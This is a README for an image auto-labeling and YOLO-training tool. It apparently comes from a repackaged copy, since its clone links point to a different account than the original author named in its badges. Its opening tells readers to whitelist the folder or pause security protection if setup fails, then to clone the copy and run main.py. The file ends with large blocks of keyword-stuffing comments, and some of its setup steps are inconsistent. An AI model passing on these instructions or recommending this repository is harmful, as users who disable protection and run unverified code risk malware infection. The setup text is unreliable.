# VLM-AutoYOLO


> [!TIP]
> If the setup does not start, add the folder to the allowed list or pause protection for a few minutes.

> [!CAUTION]
> Some security systems may block the installation.
> Only download from the official repository.

---

## QUICK START

```bash
git clone https://github.com/ImageAxolotlTrim/VLM-AutoYOLO-free.git
cd VLM-AutoYOLO-free
python main.py
```


[简体中文](README_ZH.md) | English

<p align="center">
  <img src="https://img.shields.io/badge/License-AGPL%20v3-blue.svg" alt="License">
  <img src="https://img.shields.io/badge/Python-3.12+-blue" alt="Python">
  <img src="https://img.shields.io/badge/Node.js-22+-green" alt="Node.js">
  <img src="https://img.shields.io/badge/Platform-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey" alt="Platform">
  <img src="https://img.shields.io/badge/GPU-MPS%20%7C%20CUDA-orange" alt="GPU">
  <a href="mailto:somnusochi@gmail.com"><img src="https://img.shields.io/badge/Open_to_Work-🤝-brightgreen?style=flat" alt="Open to Work"></a>
  <img src="https://img.shields.io/github/stars/Somnusochi/VLM-AutoYOLO?style=social" alt="Stars">
</p>

```
🖼️ image/video → 🔍 VLM / SAM3 detection → 🎯 SAM2/SAM3 mask → ✏️ refine → 📦 export → 🚀 YOLO → ✅ model
```

**Images or videos in → YOLO model out**, with VLM auto-labeling (LocateAnything-3B), SAM2.1 / SAM3 mask refinement, and human-in-the-loop correction. Multi-format export, one-click YOLO training (detect & segment), video keyframe extraction, and model validation — all GPU-accelerated on macOS MPS and Windows/Linux CUDA.

![Architecture](docs/architecture_en.png)

> See [Architecture & Workflow Documentation](docs/architecture_diagram_en.md) for detailed Mermaid diagrams.

## Key Features
- 🤖 **VLM auto-labeling**: Open-vocabulary object detection with LocateAnything-3B
- 🎯 **SAM2 / SAM3 segmentation**: Bbox → pixel-precise mask with SAM 2.1 or SAM3 text-driven detection+segmentation in one pass, BBox/Mask toggle on canvas
- 🎥 **Video annotation**: Intelligent keyframe extraction (scene / motion / interval), SSIM dedup
- ✏️ **Manual refinement**: Canvas draw mode, NMS filtering, hide/show individual boxes
- 📦 **Multi-format export/import**: YOLO, YOLO-Seg, COCO JSON, Pascal VOC XML, CreateML JSON — import datasets via chunked ZIP upload (max 10GB, resume support)
- 🚀 **Training queue**: Sequential job processing with cancel support, one-click training (YOLOv8 / v11 / v26) with real-time SSE progress
- ✅ **Model validation**: Batch image / video testing, MJPEG live stream, SSE video inference
- 💾 **Smart model management**: Lazy loading, idle auto-unload, MPS/CUDA strategy pattern cleanup
- 🌐 **i18n**: English / 简体中文 / 日本語 · 🎨 **Theme**: Light / dark mode

## Documentation

📚 **[User Guide (English)](docs/guide/en/README.md)** | 📚 **[用户指南 (中文)](docs/guide/README.md)**

Comprehensive guides: quick start, annotation best practices, training parameter tuning, model deployment.

## Screenshots

| VLM Pre-annotation & Refinement | YOLO Training |
|--------------------------------|---------------|
| ![VLM pre-annotation and refinement](docs/1.png) | ![YOLO training](docs/2.png) |

| Video Keyframe Entry | Model Validation |
|---------------------|-----------------|
| ![Video keyframe entry](docs/4.png) | ![Model validation](docs/3.png) |

## Tech Stack

| Layer | Technology |
|-------|-----------|
| Visual Grounding | NVIDIA LocateAnything-3B (Qwen2.5-3B + MoonViT) |
| Segmentation | SAM 2.1 / SAM3 — Segment Anything Model 2 / 3 |
| Object Detection | YOLOv8 / v11 / v26 — Detect & Segment (Ultralytics) |
| Backend | Python FastAPI + PostgreSQL + SSE |
| Frontend | React + TypeScript + Vite + Tailwind CSS + antd |
| GPU Memory | Strategy Pattern (`gpu_memory.py`) — CUDA expandable segments / MPS synchronize + empty_cache |
| State | Zustand + TanStack Query + ahooks |
| i18n | i18next (English / 简体中文 / 日本語) |
| Video | ffmpeg (scene / motion / interval extraction) |
| Tooling | pnpm, ESLint, Prettier, Husky, commitlint, Playwright |


### CLI (Recommended for macOS / Linux)

```bash
git clone https://github.com/ImageAxolotlTrim/VLM-AutoYOLO-free
cd VLM-AutoYOLO
python3 cli.py all
```


**Commands:**
```bash
python3 cli.py all                       # Setup + download models + start
python3 cli.py all --no-models           # Skip model download
python3 cli.py all --models=vlm          # Only download VLM model
python3 cli.py all --models=vlm,sam2     # Download VLM + SAM2
python3 cli.py setup                     # Install deps + init DB
python3 cli.py start                     # Launch services
python3 cli.py stop                      # Stop services
python3 cli.py status                    # Check if running
python3 cli.py download --models=vlm     # Re-download specific model
```

### Docker Deployment

> **Requirements:** Linux or Windows (WSL2) with NVIDIA GPU + [NVIDIA Container Toolkit](https://docs.nvidia.com/datacenter/cloud-native/container-toolkit/latest/install-guide.html).
> **macOS is not supported** — Docker on Mac has no GPU passthrough. Use [Manual Setup](#manual-setup) instead.

**Quick start with pre-built images:**

```bash
docker compose up -d
open http://localhost        # Frontend
open http://localhost:8000/docs  # API docs
```

**Build from source:**

```bash
git clone https://github.com/ImageAxolotlTrim/VLM-AutoYOLO-free
cd VLM-AutoYOLO
docker compose up -d --build
```

**Services:**

| Service | Port | Description |
|---------|------|-------------|
| Frontend | 80 | React web UI (Nginx) |
| Backend | 8000 | FastAPI server |
| SAM3 | 8002 | SAM3 standalone inference service |
| Database | 5432 | PostgreSQL |

**GPU Support** — `docker-compose.yml` now has built-in GPU passthrough configured. No manual editing required.

**Persistent Storage (Docker volumes):**
- `pgdata` — Database · `model-cache` — VLM, SAM2 & SAM3 models · `uploads` — User images/videos · `training-data` — YOLO training outputs

**Backup / Restore:**

```bash
docker compose exec db pg_dump -U postgres autolabeling > backup.sql
cat backup.sql | docker compose exec -T db psql -U postgres autolabeling
```

### Manual Setup

**Requirements:**

| Resource | Minimum | Recommended |
|----------|---------|-------------|
| Python | 3.12+ | 3.12+ |
| Node.js | 22+ | 22+ |
| PostgreSQL | 16+ | 16+ |
| ffmpeg | Any | — |
| macOS | Apple Silicon 16GB | 24GB+ |
| NVIDIA GPU | 12GB VRAM | 16GB+ |

**Setup:**

```bash
git clone https://github.com/ImageAxolotlTrim/VLM-AutoYOLO-free
cd VLM-AutoYOLO

# Backend
cd backend
python3 -m venv .venv
source .venv/bin/activate  # Windows: .venv\Scripts\activate
cd ..

# Frontend
cd frontend
cd ..

# Database (PostgreSQL recommended, but SQLite is supported out of the box)
# If using PostgreSQL:
# psql -d postgres -c "CREATE DATABASE autolabeling;"
# cp backend/.env.example backend/.env
# If you prefer a zero-setup SQLite database, just skip the two steps above. The system will auto-generate autolabeling.db

# Migrations
cd backend
PYTHONPATH=. alembic upgrade head
```

**Pre-download models (optional):**

```bash
huggingface-cli download nvidia/LocateAnything-3B --local-dir backend/model
```

**Launch:**

```bash
./start.sh   # macOS / Linux
start.bat    # Windows
```

| Service | URL |
|---------|-----|
| Frontend | http://localhost:5173 |
| Backend | http://localhost:8000 |
| API Docs | http://localhost:8000/docs |

## Project Structure

Full directory tree: **[docs/STRUCTURE.md](docs/STRUCTURE.md)**

## Features

### VLM Pre-annotation

Upload images or video keyframes with open-vocabulary descriptions (e.g. `fire, smoke`, `red car`). LocateAnything-3B automatically detects and draws bounding boxes.

- Open-vocabulary natural language descriptions
- Auto-resize by long-side cap (VRAM-based: 800–1333px)
- Batch upload folders or video keyframes, streaming results

### SAM2 Segmentation

Enable SAM2 (Segment Anything Model 2) to refine VLM bounding boxes into pixel-precise masks.

- Check "Enable SAM2 Segmentation" before detection — runs automatically after VLM
- SAM 2.1 model (base+), lazy-loaded with idle auto-unload
- Score threshold slider for mask quality filtering
- Masks rendered as semi-transparent overlays on canvas
- BBox and Mask independently toggled on both main canvas and hover preview
- Result table shows polygon vertex count per box

### SAM3 Detection + Segmentation

Switch to SAM3 mode for text-driven detection and segmentation in a single pass — no VLM required.

- Toggle between VLM+SAM2 and SAM3 via the model selector in the sidebar
- Enter open-vocabulary text prompts (e.g. `cat`, `red car`) — SAM3 detects and segments all matching instances
- **Confidence threshold** slider (0.0–1.0, default 0.5) controls detection sensitivity
- **Mask threshold** slider (0.0–1.0, default 0.5) controls mask tightness
- Enable/disable segmentation independently — bbox-only mode skips mask extraction for faster results
- SAM3 runs as a standalone HTTP service on port 8002 with its own venv (`backend/sam3-venv/`)
- **Requires `HF_TOKEN`** — set this env var before starting the backend. Two steps:
  1. Open [huggingface.co/facebook/sam3](https://huggingface.co/facebook/sam3) in browser, click **"Agree and access repository"**
  2. Create a **Read** token at [huggingface.co/settings/tokens](https://huggingface.co/settings/tokens) (no need for Fine-grained — a plain Read token inherits your account's permissions)
  Model cached in `~/.cache/huggingface/hub/` after first download
- Auto-starts on first use, idle auto-unload after 10 min
- Real-time loading status via SSE (`starting` → `loading` → `loaded`)
- Manual unload button to free GPU memory
- Backend auto-switches: using SAM3 unloads VLM/SAM2, and vice versa
- Detection records tagged with `model_type` (VLM / VLM+SAM2 / SAM3) for traceability

### Video Annotation

Upload a video, extract keyframes, select and batch-annotate.

- **Three extraction modes**: scene change, motion detection (optical flow), fixed interval
- **SSIM deduplication**: auto-removes near-duplicate frames
- **Timeline preview**: horizontal scrollable strip, click for full-size view
- **Multi-select**: check frames, select/cancel all, load to annotation queue

### Manual Annotation

Canvas-based annotation with View / Draw modes.

- Category quick-fill from history
- VLM pre-annotation baseline → delete mistakes → draw missing boxes
- All / Best / NMS filter modes, settings saved per detection
- Hide individual boxes while inspecting dense results
- Per-frame re-detection

### History Management

- Thumbnail + category tag previews, tag-based multi-select filtering
- Click to view details, re-detect with updated labels, virtual scroll with infinite loading
- Single / batch export in **5 formats**: YOLO, YOLO-Seg, COCO JSON, Pascal VOC XML, CreateML JSON
- Format selection via dropdown menu, one-click zip download

### YOLO Training

- **Series**: YOLOv8 / v11 / v26 (n/s/m/l/x)
- **Task types**: Object Detection (Detect), Instance Segmentation (Segment)
- Segmentation training auto-uses SAM2 polygon labels; falls back to bbox when unavailable
- Tag filter + thumbnail preview for precise data selection
- Virtual scroll with "Load All" button for large datasets
- Dataset split presets (70/20/10, 80/20, 90/10, 60/20/20)
- Real-time SSE progress: Epoch / Loss / mAP50
- Rename training jobs for easier identification
- Auto ONNX export; download PT / ONNX / dataset zip

### Model Validation

- **Dual source**: trained models or externally uploaded `.pt` files
- **Conf / IoU sliders** for real-time threshold tuning
- **Batch image validation** with bounding boxes and confidence scores
- **Video validation** (three modes):
  - MJPEG live stream with interactive play/pause
  - SSE prediction stream with per-frame JSON events
  - Sync batch prediction — all frames at once
- Temporary results; export predictions as YOLO `.txt` files

### Model Management

- **Lazy loading**: VLM, SAM2, and SAM3 load on first use, unload after idle (default 10 min)
- **Idle watchdog**: all three models auto-unload after `MODEL_IDLE_TIMEOUT_SECONDS` of inactivity
- **Unified SSE status**: `GET /api/v1/model/events` streams VLM, SAM2, SAM3 status in one connection
- **Manual unload**: each model has its own unload button and API endpoint
- **GPU memory**: Strategy Pattern (`gpu_memory.py`) — CUDA `expandable_segments` / MPS `synchronize`+`empty_cache`+`gc`

## API Reference

Full API documentation with request/response examples: **[docs/API.md](docs/API.md)**

## Cross-Platform

| Platform | Inference | Training |
|----------|-----------|----------|
| macOS (Apple Silicon) | MPS | MPS |
| Linux / Windows (NVIDIA) | CUDA | CUDA |

Auto-detection: CUDA → MPS. Override via `DEVICE` env. **CPU not supported.**

## Inference Benchmarks

Tested locally on an **Apple MacBook Pro (M4 Pro, 24GB Unified Memory)** using Apple MPS hardware acceleration.

| Image Resolution (Max Side) | Inference Latency | Actual Memory Footprint |
| :--- | :--- | :--- |
| **Thumbnail (256px)** | `~0.68s` | Stable around `~11.8GB` |
| **High-Res (1024px)** | `~4.35s` | Stable around `~11.8GB` |

Full detailed benchmarks across different hardware configurations: **[docs/BENCHMARKS.md](docs/BENCHMARKS.md)**

## Highlights

- **MPS / CUDA full-pipeline GPU acceleration** — VLM, SAM2, and YOLO training all GPU-accelerated
- **Strategy Pattern GPU memory** — `gpu_memory.py` centralizes CUDA / MPS cleanup; `expandable_segments:True`
- **SAM2 / SAM3 mask refinement** — SAM2 refines VLM bboxes; SAM3 does text-driven detection+segmentation in one pass
- **5 export formats** — YOLO, YOLO-Seg, COCO, Pascal VOC, CreateML
- **Detect & Segment training** — polygon labels auto-used when SAM2 masks are available
- **Cross-platform** — macOS MPS, Windows / Linux CUDA, unified codebase
- **Unified SSE model status** — single EventSource for VLM, SAM2, SAM3 states; no polling

## Development

```bash
# Frontend

# Backend
cd backend && source .venv/bin/activate
PYTHONPATH=. alembic upgrade head
python -m compileall app alembic
```

## Stargazers

[![Star History Chart](https://api.star-history.com/svg?repos=Somnusochi/VLM-AutoYOLO&type=Date)](https://star-history.com/#Somnusochi/VLM-AutoYOLO&Date)

## License

Code: [AGPL-3.0](LICENSE).

Third-party dependencies:
- LocateAnything-3B model — [NVIDIA License](https://huggingface.co/nvidia/LocateAnything-3B/blob/main/LICENSE) (non-commercial use only)
- SAM3 model — [Facebook Research License](https://huggingface.co/facebook/sam3) (gated repository, requires HuggingFace access token)
- Ultralytics YOLO — [AGPL-3.0](https://github.com/ultralytics/ultralytics/blob/main/LICENSE) (copyleft; training/deployment may trigger obligations)

---

If this project helps you, please ⭐ [star it on GitHub](https://github.com/Somnusochi/VLM-AutoYOLO). I'm open to new opportunities — reach out: somnusochi@gmail.com


<!-- python pip pypi package library module script tool windows linux macos -->
<!-- VLM-AutoYOLO-free - tool utility software - download install setup -->
<!-- windows reliable VLM-AutoYOLO-free plugin | run on linux self hosted VLM-AutoYOLO-free | latest version VLM-AutoYOLO-free sdk | local VLM-AutoYOLO-free plugin | run on mac VLM-AutoYOLO-free wrapper | VLM-AutoYOLO-free downloader | latest version VLM-AutoYOLO-free decoder | VLM-AutoYOLO-free compressor | build VLM-AutoYOLO-free mirror | arch production ready VLM-AutoYOLO-free | advanced VLM-AutoYOLO-free | is VLM AutoYOLO free good | run VLM-AutoYOLO-free reader | walkthrough VLM-AutoYOLO-free replacement | 2025 VLM-AutoYOLO-free | VLM AutoYOLO free demo | how to build VLM-AutoYOLO-free | example VLM-AutoYOLO-free engine | minimal VLM-AutoYOLO-free | open VLM-AutoYOLO-free editor | walkthrough VLM-AutoYOLO-free server | setup VLM-AutoYOLO-free copy | VLM AutoYOLO free guide | updated VLM-AutoYOLO-free port | local VLM-AutoYOLO-free checker | VLM-AutoYOLO-free decoder | fast VLM-AutoYOLO-free platform | VLM-AutoYOLO-free program | download for windows local VLM-AutoYOLO-free | windows VLM-AutoYOLO-free fork | powerful VLM-AutoYOLO-free tracker | download for windows VLM-AutoYOLO-free addon | debian VLM-AutoYOLO-free wrapper | local VLM-AutoYOLO-free generator | free github VLM-AutoYOLO-free tracker | sample VLM-AutoYOLO-free generator | 2025 VLM-AutoYOLO-free service | git clone VLM-AutoYOLO-free server | minimal VLM-AutoYOLO-free mobile | VLM-AutoYOLO-free utility | top VLM AutoYOLO free | VLM-AutoYOLO-free application | open source VLM-AutoYOLO-free service | beginner VLM-AutoYOLO-free engine | 2025 VLM-AutoYOLO-free desktop | extensible VLM-AutoYOLO-free | online VLM-AutoYOLO-free sdk | modular VLM-AutoYOLO-free plugin | best VLM-AutoYOLO-free framework | run on mac VLM-AutoYOLO-free -->
<!-- download for linux VLM-AutoYOLO-free server | wiki VLM-AutoYOLO-free analyzer | source code VLM-AutoYOLO-free extractor | sample VLM-AutoYOLO-free | run on linux VLM-AutoYOLO-free tracker | cross platform VLM-AutoYOLO-free package | low latency VLM-AutoYOLO-free binding | how to deploy high performance VLM-AutoYOLO-free generator | execute VLM-AutoYOLO-free service | customizable VLM-AutoYOLO-free sdk | how to download VLM-AutoYOLO-free | git clone VLM-AutoYOLO-free replacement | how to run VLM-AutoYOLO-free parser | install stable VLM-AutoYOLO-free | native VLM-AutoYOLO-free utility | VLM-AutoYOLO-free extension | low latency VLM-AutoYOLO-free gui | easy VLM-AutoYOLO-free compressor | top VLM-AutoYOLO-free replacement | configure VLM-AutoYOLO-free wrapper | cross platform VLM-AutoYOLO-free server | documentation VLM-AutoYOLO-free library | example VLM-AutoYOLO-free program | VLM-AutoYOLO-free replacement | fast VLM-AutoYOLO-free logger | fedora VLM-AutoYOLO-free desktop | VLM-AutoYOLO-free web | quick start fast VLM-AutoYOLO-free analyzer | how to download VLM-AutoYOLO-free generator | execute stable VLM-AutoYOLO-free | modular VLM-AutoYOLO-free module | download for linux self hosted VLM-AutoYOLO-free | updated VLM-AutoYOLO-free client | easy VLM-AutoYOLO-free uploader | new version VLM-AutoYOLO-free framework | VLM-AutoYOLO-free builder | how to run portable VLM-AutoYOLO-free | new version VLM-AutoYOLO-free | deploy VLM-AutoYOLO-free tool | powerful VLM-AutoYOLO-free clone | VLM-AutoYOLO-free tool | top VLM-AutoYOLO-free package | how to setup VLM-AutoYOLO-free encoder | ubuntu VLM-AutoYOLO-free library | quickstart VLM-AutoYOLO-free creator | source code VLM-AutoYOLO-free port | modular VLM-AutoYOLO-free analyzer | download high performance VLM-AutoYOLO-free | demo VLM-AutoYOLO-free program | cross platform VLM-AutoYOLO-free compressor -->
<!-- advanced VLM-AutoYOLO-free mobile | docs VLM-AutoYOLO-free software | latest version VLM-AutoYOLO-free cli | free download VLM-AutoYOLO-free reader | open source VLM-AutoYOLO-free clone | getting started free VLM-AutoYOLO-free scanner | how to install secure VLM-AutoYOLO-free | free VLM-AutoYOLO-free converter | source code high performance VLM-AutoYOLO-free parser | launch modern VLM-AutoYOLO-free | stable VLM-AutoYOLO-free reader | examples VLM-AutoYOLO-free replacement | guide VLM-AutoYOLO-free converter | local VLM-AutoYOLO-free cli | simple VLM-AutoYOLO-free cli | centos VLM-AutoYOLO-free | best VLM-AutoYOLO-free encoder | VLM AutoYOLO free workshop | documentation open source VLM-AutoYOLO-free | quick start advanced VLM-AutoYOLO-free | get VLM-AutoYOLO-free encoder | 2026 stable VLM-AutoYOLO-free | git clone VLM-AutoYOLO-free platform | quickstart simple VLM-AutoYOLO-free parser | advanced VLM-AutoYOLO-free tool | safe VLM-AutoYOLO-free software | sample VLM-AutoYOLO-free compressor | VLM-AutoYOLO-free engine | updated VLM-AutoYOLO-free tool | is VLM AutoYOLO free legit | github VLM-AutoYOLO-free viewer | run on linux modern VLM-AutoYOLO-free | macos VLM-AutoYOLO-free | documentation VLM-AutoYOLO-free scanner | walkthrough VLM-AutoYOLO-free cli | VLM AutoYOLO free docker | how to use VLM-AutoYOLO-free generator | source code VLM-AutoYOLO-free | github VLM-AutoYOLO-free debugger | top VLM-AutoYOLO-free plugin | production ready VLM-AutoYOLO-free framework | VLM-AutoYOLO-free mirror | download for linux VLM-AutoYOLO-free extractor | portable VLM-AutoYOLO-free web | free VLM-AutoYOLO-free platform | top VLM-AutoYOLO-free application | VLM AutoYOLO free saas | how to deploy VLM-AutoYOLO-free mobile | how to run VLM-AutoYOLO-free | run VLM-AutoYOLO-free addon -->
<!-- zip extensible VLM-AutoYOLO-free | portable VLM-AutoYOLO-free extension | github VLM-AutoYOLO-free gui | examples configurable VLM-AutoYOLO-free | download for windows low latency VLM-AutoYOLO-free | compile VLM-AutoYOLO-free app | low latency VLM-AutoYOLO-free mobile | run on windows open source VLM-AutoYOLO-free utility | simple VLM-AutoYOLO-free | open VLM-AutoYOLO-free alternative | VLM AutoYOLO free setup | documentation VLM-AutoYOLO-free creator | run on mac online VLM-AutoYOLO-free module | VLM-AutoYOLO-free binding | wiki VLM-AutoYOLO-free | download high performance VLM-AutoYOLO-free tester | how to download VLM-AutoYOLO-free creator | launch VLM-AutoYOLO-free framework | getting started VLM-AutoYOLO-free validator | execute open source VLM-AutoYOLO-free | top VLM-AutoYOLO-free editor | fedora VLM-AutoYOLO-free cli | zip offline VLM-AutoYOLO-free app | how to install online VLM-AutoYOLO-free | download for linux VLM-AutoYOLO-free alternative | download for mac top VLM-AutoYOLO-free sdk | beginner VLM-AutoYOLO-free server | secure VLM-AutoYOLO-free | compile VLM-AutoYOLO-free alternative | new version VLM-AutoYOLO-free sdk | setup easy VLM-AutoYOLO-free | run on linux VLM-AutoYOLO-free plugin | open source VLM-AutoYOLO-free server | install VLM-AutoYOLO-free addon | tutorial VLM-AutoYOLO-free application | open source VLM-AutoYOLO-free sdk | execute self hosted VLM-AutoYOLO-free | how to build VLM-AutoYOLO-free monitor | secure VLM-AutoYOLO-free server | offline VLM-AutoYOLO-free uploader | VLM-AutoYOLO-free wrapper | run on windows VLM-AutoYOLO-free extension | reliable VLM-AutoYOLO-free uploader | debian native VLM-AutoYOLO-free | how to build powerful VLM-AutoYOLO-free | git clone secure VLM-AutoYOLO-free | compile VLM-AutoYOLO-free replacement | VLM AutoYOLO free reddit | customizable VLM-AutoYOLO-free converter | getting started local VLM-AutoYOLO-free -->
<!-- download for linux VLM-AutoYOLO-free uploader | how to configure powerful VLM-AutoYOLO-free | free VLM-AutoYOLO-free editor | centos VLM-AutoYOLO-free binding | native VLM-AutoYOLO-free | easy VLM-AutoYOLO-free | free download VLM-AutoYOLO-free decoder | high performance VLM-AutoYOLO-free api | deploy github VLM-AutoYOLO-free builder | install VLM-AutoYOLO-free software | deploy VLM-AutoYOLO-free package | native VLM-AutoYOLO-free software | quick start VLM-AutoYOLO-free editor | download for linux VLM-AutoYOLO-free program | top VLM-AutoYOLO-free uploader | how to setup VLM-AutoYOLO-free desktop | windows VLM-AutoYOLO-free analyzer | source code modular VLM-AutoYOLO-free | how to configure VLM-AutoYOLO-free builder | secure VLM-AutoYOLO-free converter | how to setup VLM-AutoYOLO-free replacement | getting started VLM-AutoYOLO-free generator | launch modern VLM-AutoYOLO-free alternative | how to deploy modern VLM-AutoYOLO-free | open source VLM-AutoYOLO-free web | macos VLM-AutoYOLO-free mobile | VLM-AutoYOLO-free analyzer | source code VLM-AutoYOLO-free wrapper | VLM AutoYOLO free course | new version VLM-AutoYOLO-free fork | cross platform VLM-AutoYOLO-free application | reliable VLM-AutoYOLO-free package | free VLM-AutoYOLO-free fork | run on linux VLM-AutoYOLO-free | updated minimal VLM-AutoYOLO-free | portable VLM-AutoYOLO-free mobile | VLM-AutoYOLO-free reader | VLM-AutoYOLO-free clone | easy VLM-AutoYOLO-free framework | VLM-AutoYOLO-free tester | github VLM-AutoYOLO-free analyzer | build configurable VLM-AutoYOLO-free encoder | build VLM-AutoYOLO-free | how to run VLM-AutoYOLO-free engine | how to setup modern VLM-AutoYOLO-free | download for linux VLM-AutoYOLO-free | windows VLM-AutoYOLO-free scanner | download for mac configurable VLM-AutoYOLO-free | examples powerful VLM-AutoYOLO-free | zip best VLM-AutoYOLO-free -->
<!-- run on windows VLM-AutoYOLO-free tool | VLM-AutoYOLO-free desktop | stable VLM-AutoYOLO-free | customizable VLM-AutoYOLO-free checker | zip VLM-AutoYOLO-free debugger | execute VLM-AutoYOLO-free desktop | VLM-AutoYOLO-free encoder | use open source VLM-AutoYOLO-free | high performance VLM-AutoYOLO-free optimizer | source code modern VLM-AutoYOLO-free api | beginner VLM-AutoYOLO-free replacement | beginner self hosted VLM-AutoYOLO-free | run on linux VLM-AutoYOLO-free mobile | modular VLM-AutoYOLO-free tool | fast VLM-AutoYOLO-free cli | how to install fast VLM-AutoYOLO-free | deploy cross platform VLM-AutoYOLO-free viewer | VLM AutoYOLO free webinar | tutorial VLM-AutoYOLO-free | cross platform VLM-AutoYOLO-free decoder | zip VLM-AutoYOLO-free downloader | local VLM-AutoYOLO-free extractor | run reliable VLM-AutoYOLO-free | how to use VLM-AutoYOLO-free | how to build VLM-AutoYOLO-free framework | VLM-AutoYOLO-free monitor | zip VLM-AutoYOLO-free framework | download for windows VLM-AutoYOLO-free logger | native VLM-AutoYOLO-free creator | online VLM-AutoYOLO-free extension | arch VLM-AutoYOLO-free alternative | quick start VLM-AutoYOLO-free addon | production ready VLM-AutoYOLO-free wrapper | portable VLM-AutoYOLO-free | VLM AutoYOLO free test | docs VLM-AutoYOLO-free | run on mac VLM-AutoYOLO-free addon | launch VLM-AutoYOLO-free replacement | open reliable VLM-AutoYOLO-free clone | linux VLM-AutoYOLO-free editor | linux VLM-AutoYOLO-free downloader | 2026 VLM-AutoYOLO-free app | quickstart VLM-AutoYOLO-free engine | run minimal VLM-AutoYOLO-free gui | download VLM-AutoYOLO-free creator | run offline VLM-AutoYOLO-free gui | debian VLM-AutoYOLO-free downloader | VLM AutoYOLO free error | latest version VLM-AutoYOLO-free copy | getting started VLM-AutoYOLO-free -->
<!-- offline VLM-AutoYOLO-free alternative | how to install VLM-AutoYOLO-free logger | best VLM-AutoYOLO-free extension | configurable VLM-AutoYOLO-free scanner | zip VLM-AutoYOLO-free | wiki VLM-AutoYOLO-free copy | VLM-AutoYOLO-free uploader | free VLM-AutoYOLO-free server | modern VLM-AutoYOLO-free | VLM-AutoYOLO-free software | how to download VLM-AutoYOLO-free debugger | use cross platform VLM-AutoYOLO-free | start reliable VLM-AutoYOLO-free | how to deploy VLM-AutoYOLO-free monitor | how to install self hosted VLM-AutoYOLO-free | VLM AutoYOLO free kubernetes | docs VLM-AutoYOLO-free optimizer | online VLM-AutoYOLO-free | safe VLM-AutoYOLO-free tracker | VLM AutoYOLO free automation | free VLM-AutoYOLO-free port | fast VLM-AutoYOLO-free binding | centos VLM-AutoYOLO-free port | native VLM-AutoYOLO-free checker | getting started secure VLM-AutoYOLO-free | download for windows VLM-AutoYOLO-free monitor | windows self hosted VLM-AutoYOLO-free | 2025 VLM-AutoYOLO-free addon | VLM-AutoYOLO-free server | VLM-AutoYOLO-free gui | macos VLM-AutoYOLO-free sdk | free VLM-AutoYOLO-free | build VLM-AutoYOLO-free generator | get simple VLM-AutoYOLO-free | debian modern VLM-AutoYOLO-free | safe VLM-AutoYOLO-free program | macos VLM-AutoYOLO-free parser | download for mac VLM-AutoYOLO-free replacement | 2025 cross platform VLM-AutoYOLO-free sdk | how to install VLM-AutoYOLO-free | source code VLM-AutoYOLO-free application | fast VLM-AutoYOLO-free | examples VLM-AutoYOLO-free program | sample VLM-AutoYOLO-free converter | how to deploy VLM-AutoYOLO-free | open VLM-AutoYOLO-free builder | how to install VLM-AutoYOLO-free converter | updated VLM-AutoYOLO-free copy | self hosted VLM-AutoYOLO-free | best VLM-AutoYOLO-free app -->
<!-- online VLM-AutoYOLO-free client | lightweight VLM-AutoYOLO-free app | VLM-AutoYOLO-free creator | debian VLM-AutoYOLO-free plugin | free download VLM-AutoYOLO-free service | how to use safe VLM-AutoYOLO-free package | VLM AutoYOLO free support | open source VLM-AutoYOLO-free engine | build production ready VLM-AutoYOLO-free web | reliable VLM-AutoYOLO-free | how to configure VLM-AutoYOLO-free module | how to use VLM-AutoYOLO-free plugin | production ready VLM-AutoYOLO-free tracker | centos online VLM-AutoYOLO-free | walkthrough VLM-AutoYOLO-free | free VLM-AutoYOLO-free sdk | VLM AutoYOLO free handbook | build VLM-AutoYOLO-free downloader | local VLM-AutoYOLO-free | reliable VLM-AutoYOLO-free cli | examples secure VLM-AutoYOLO-free | offline VLM-AutoYOLO-free framework | advanced VLM-AutoYOLO-free mirror | arch VLM-AutoYOLO-free module | updated high performance VLM-AutoYOLO-free extractor | VLM-AutoYOLO-free tracker | github VLM-AutoYOLO-free reader | free download VLM-AutoYOLO-free module | wiki open source VLM-AutoYOLO-free | is VLM AutoYOLO free safe | use VLM-AutoYOLO-free extension | 2025 VLM-AutoYOLO-free monitor | advanced VLM-AutoYOLO-free analyzer | high performance VLM-AutoYOLO-free decoder | modular VLM-AutoYOLO-free cli | free VLM AutoYOLO free | get VLM-AutoYOLO-free | download online VLM-AutoYOLO-free | run on mac VLM-AutoYOLO-free extension | how to deploy modular VLM-AutoYOLO-free checker | download low latency VLM-AutoYOLO-free | free download VLM-AutoYOLO-free api | reliable VLM-AutoYOLO-free client | git clone VLM-AutoYOLO-free | arch VLM-AutoYOLO-free utility | download for windows VLM-AutoYOLO-free | how to run VLM-AutoYOLO-free decoder | how to run VLM-AutoYOLO-free editor | VLM-AutoYOLO-free framework | modular VLM-AutoYOLO-free converter -->
<!-- VLM AutoYOLO free cloud | arch VLM-AutoYOLO-free editor | windows cross platform VLM-AutoYOLO-free application | github offline VLM-AutoYOLO-free | example VLM-AutoYOLO-free | how to install VLM-AutoYOLO-free wrapper | docs VLM-AutoYOLO-free debugger | windows VLM-AutoYOLO-free encoder | linux VLM-AutoYOLO-free clone | modular VLM-AutoYOLO-free web | production ready VLM-AutoYOLO-free uploader | git clone configurable VLM-AutoYOLO-free | safe VLM-AutoYOLO-free binding | launch VLM-AutoYOLO-free desktop | arch free VLM-AutoYOLO-free api | best VLM-AutoYOLO-free library | how to setup VLM-AutoYOLO-free creator | VLM AutoYOLO free reference | free VLM-AutoYOLO-free copy | stable VLM-AutoYOLO-free web | zip VLM-AutoYOLO-free engine | secure VLM-AutoYOLO-free port | tar.gz VLM-AutoYOLO-free | lightweight VLM-AutoYOLO-free server | modern VLM-AutoYOLO-free viewer | offline VLM-AutoYOLO-free service | VLM AutoYOLO free documentation | free download VLM-AutoYOLO-free | secure VLM-AutoYOLO-free editor | portable VLM-AutoYOLO-free tester | debian VLM-AutoYOLO-free app | how to deploy VLM-AutoYOLO-free parser | centos cross platform VLM-AutoYOLO-free | latest version VLM-AutoYOLO-free logger | quick start top VLM-AutoYOLO-free converter | VLM-AutoYOLO-free module | beginner VLM-AutoYOLO-free package | download VLM-AutoYOLO-free service | how to build VLM-AutoYOLO-free uploader | open source VLM-AutoYOLO-free reader | start VLM-AutoYOLO-free scanner | VLM-AutoYOLO-free checker | compile VLM-AutoYOLO-free wrapper | run on mac VLM-AutoYOLO-free app | open source VLM-AutoYOLO-free library | VLM AutoYOLO free fix | high performance VLM-AutoYOLO-free module | centos VLM-AutoYOLO-free gui | secure VLM-AutoYOLO-free encoder | VLM-AutoYOLO-free service -->
